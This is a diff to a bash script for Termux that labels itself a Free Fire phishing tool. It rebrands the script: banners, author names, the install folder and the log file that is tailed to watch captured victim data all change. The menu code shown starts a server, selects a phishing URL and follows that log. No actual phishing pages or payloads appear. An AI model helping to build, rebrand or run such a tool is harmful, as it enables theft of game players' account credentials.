@@ -587,59 +587,14 @@ logo_last() {
 }
 
 
+
 cd_home() {
-cd /data/data/com.termux/files/usr/bin/.SUMAN/
+cd /data/data/com.termux/files/usr/bin/.SANDEEP/
 }
 
 
 ## LOGO 1
-logo1() {
-#clolors
-white='\e[1;37m'
-green='\e[0;32m'
-blue='\e[1;34m'
-red='\e[1;31m'
-yellow='\e[1;33m' 
-echo ""
-banner() {
-echo -e ""
-echo -e "\e[33m
-  ███████╗██████╗ ███████╗███████╗    ███████╗██╗██████╗ ███████╗ 
-  ██╔════╝██╔══██╗██╔════╝██╔════╝    ██╔════╝██║██╔══██╗██╔════╝ 
-  █████╗  ██████╔╝█████╗  █████╗█████╗█████╗  ██║██████╔╝█████╗   
-  ██╔══╝  ██╔══██╗██╔══╝  ██╔══╝╚════╝██╔══╝  ██║██╔══██╗██╔══╝   
-  ██║     ██║  ██║███████╗███████╗    ██║     ██║██║  ██║███████╗ 
-  ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝  \e[0m\n"
-echo -e "\e[95m 
-         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
-        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
-        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
-        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
-        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
-         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
-                                                            
-     ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
-     ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
-     ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
-     ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
-     ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
-     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝  \e[95;1m \e[0m\n"
-  echo""    
-  echo -e $'\e[1;33m\e[0m\e[1;31m  ██████████\e[0m'"\e[1;37m██████████"'\e[1;33m\e[0m\e[0;32m██████████\e[0m' '\e[1;32m\e[0m\e[1;33m FREE FIRE PHISHING TOOL \e[0m''\e[1;37m\e[0m\e[1;37m [v 2.8] \e[0m'                                       
-  echo ""
-   echo -e $'\e[1;33m\e[0m\e[1;33m  [\e[0m\e[1;32m Github :- \e[36mhttps://github.com/OnlineHacKing/FreeFire-Phishing \e[0m\e[1;32m\e[0m\e[1;33m] \e[0m'
-   echo ""
-      echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+-+ +-+-+-+-+-+-+-+ >>\e[0m'
-      echo -e "\e[93m    |O|n|l|i|n|e| |H|a|c|k|i|n|g|"      
-      echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+-+ +-+-+-+-+-+-+-+ >>\e[0m' 
-      echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+ >>\e[0m'
-      echo -e "\e[95m    |S|U|M|A|N|"      
-      echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+ >>\e[0m' 
-      echo ""                                                
-      }
-      banner
-                           echo ""
-}
+ddsd
 
 ## LOGO 2
 logo_text() {
@@ -673,37 +628,18 @@ echo ""
 }
 
 
-logo3() {
-echo -e ""
-clear
-echo -e ""
-echo -e "\e[33m
-  ███████╗██████╗ ███████╗███████╗    ███████╗██╗██████╗ ███████╗ 
-  ██╔════╝██╔══██╗██╔════╝██╔════╝    ██╔════╝██║██╔══██╗██╔════╝ 
-  █████╗  ██████╔╝█████╗  █████╗█████╗█████╗  ██║██████╔╝█████╗   
-  ██╔══╝  ██╔══██╗██╔══╝  ██╔══╝╚════╝██╔══╝  ██║██╔══██╗██╔══╝   
-  ██║     ██║  ██║███████╗███████╗    ██║     ██║██║  ██║███████╗ 
-  ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝  \e[0m\n"
-echo -e " "
-}
-
 l_logo() {
 clear
 echo -e "\e[92m
-SUMAN ©\e[34m
-         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
-        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
-        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
-        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
-        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
-         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
+$(cfonts ">> FREE-FIRE <<" -f tiny -a center -g yellow,red)
                                                             
+
     ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
     ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
     ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
     ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
     ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
-    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   
+    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚══════╝   
 SANDEEP TECH			  							  							  
           \e[m"
 echo -e " \e[36mWebsite : \e[0m\e[92mwww.onlinehacking.in  \e[93m/  \e[92mwww.onlinehacking.org  "
@@ -712,8 +648,8 @@ echo -e " \e[31mGitHub : \e[0m\e[93mhttps://github.com/OnlineHacKing  "
 echo ""
 echo -e " \e[97mTelegram : \e[0m\e[34mhttps://t.me/OnlineHacKing  "
 echo ""
-
 }
+
 
 
 links_c() {
@@ -1070,12 +1006,12 @@ echo ""
 			   server
 			   select_url
 			   
-                           if [[ -e OnlineHacking.txt ]]; then
-                           > OnlineHacking.txt
+                           if [[ -e sandeeptech.txt ]]; then
+                           > sandeeptech.txt
                            fi 
                            echo ""
                            echo ""
-                           tail -f OnlineHacking.txt
+                           tail -f sandeeptech.txt
                            msg_exit
 
 
@@ -1088,12 +1024,12 @@ echo ""
 			   server
 			   select_url
                            
-                           if [[ -e OnlineHacking.txt ]]; then
-                           > OnlineHacking.txt
+                           if [[ -e sandeeptech.txt ]]; then
+                           > sandeeptech.txt
                            fi 
                            echo ""
                            echo ""
-                           tail -f OnlineHacking.txt
+                           tail -f sandeeptech.txt
                            msg_exit
 
 
@@ -1107,12 +1043,12 @@ echo ""
 			   server
 			   select_url
 
-                           if [[ -e OnlineHacking.txt ]]; then
-                           > OnlineHacking.txt
+                           if [[ -e sandeeptech.txt ]]; then
+                           > sandeeptech.txt
                            fi 
                            echo ""
                            echo ""
-                           tail -f OnlineHacking.txt 
+                           tail -f sandeeptech.txt 
                            msg_exit
  
                   
@@ -1126,12 +1062,12 @@ echo ""
 			   select_url
                            
                            
-                           if [[ -e OnlineHacking.txt ]]; then
-                           > OnlineHacking.txt
+                           if [[ -e sandeeptech.txt ]]; then
+                           > sandeeptech.txt
                            fi 
                            echo ""
                            echo ""
-                           tail -f OnlineHacking.txt
+                           tail -f sandeeptech.txt
                   msg_exit
                
 	       
@@ -1146,12 +1082,12 @@ echo ""
 			   server
 			   select_url
                            
-                           if [[ -e OnlineHacking.txt ]]; then
-                           > OnlineHacking.txt
+                           if [[ -e sandeeptech.txt ]]; then
+                           > sandeeptech.txt
                            fi 
                            echo ""
                            echo ""
-                           tail -f OnlineHacking.txt
+                           tail -f sandeeptech.txt
                   msg_exit
 		  
                  break;
@@ -1164,12 +1100,12 @@ echo ""
 			   server
 			   select_url
                            
-                           if [[ -e OnlineHacking.txt ]]; then
+                           if [[ -e sandeeptech.txt ]]; then
                            > log.txt
                            fi 
                            echo ""
                            echo ""
-                           tail -f OnlineHacking.txt 
+                           tail -f sandeeptech.txt 
                   msg_exit
 		  
                 break;
@@ -1181,12 +1117,12 @@ echo ""
 			   server
 			   select_url
                            
-                           if [[ -e OnlineHacking.txt ]]; then
-                           > OnlineHacking.txt
+                           if [[ -e sandeeptech.txt ]]; then
+                           > sandeeptech.txt
                            fi 
                            echo ""
                            echo ""
-                           tail -f OnlineHacking.txt
+                           tail -f sandeeptech.txt
 msg_exit
 
                   break;
@@ -1198,12 +1134,12 @@ msg_exit
 			   server
 			   select_url
                            
-                           if [[ -e OnlineHacking.txt ]]; then
-                           > OnlineHacking.txt
+                           if [[ -e sandeeptech.txt ]]; then
+                           > sandeeptech.txt
                            fi 
                            echo ""
                            echo ""
-                           tail -f OnlineHacking.txt
+                           tail -f sandeeptech.txt
 msg_exit
 
                   break;   
@@ -1216,12 +1152,12 @@ elif [ $option = 09 ] || [ $option = 9 ]
 			   server
 			   select_url
                            
-                           if [[ -e OnlineHacking.txt ]]; then
-                           > OnlineHacking.txt
+                           if [[ -e sandeeptech.txt ]]; then
+                           > sandeeptech.txt
                            fi 
                            echo ""
                            echo ""
-                           tail -f OnlineHacking.txt
+                           tail -f sandeeptech.txt
 msg_exit
 
                   break;		  
@@ -1233,12 +1169,12 @@ elif [ $option = 10 ] || [ $option = 010 ]
 			   server
 			   select_url
                            
-                           if [[ -e OnlineHacking.txt ]]; then
-                           > OnlineHacking.txt
+                           if [[ -e sandeeptech.txt ]]; then
+                           > sandeeptech.txt
                            fi 
                            echo ""
                            echo ""
-                           tail -f OnlineHacking.txt
+                           tail -f sandeeptech.txt
 msg_exit
 
                   break;		  
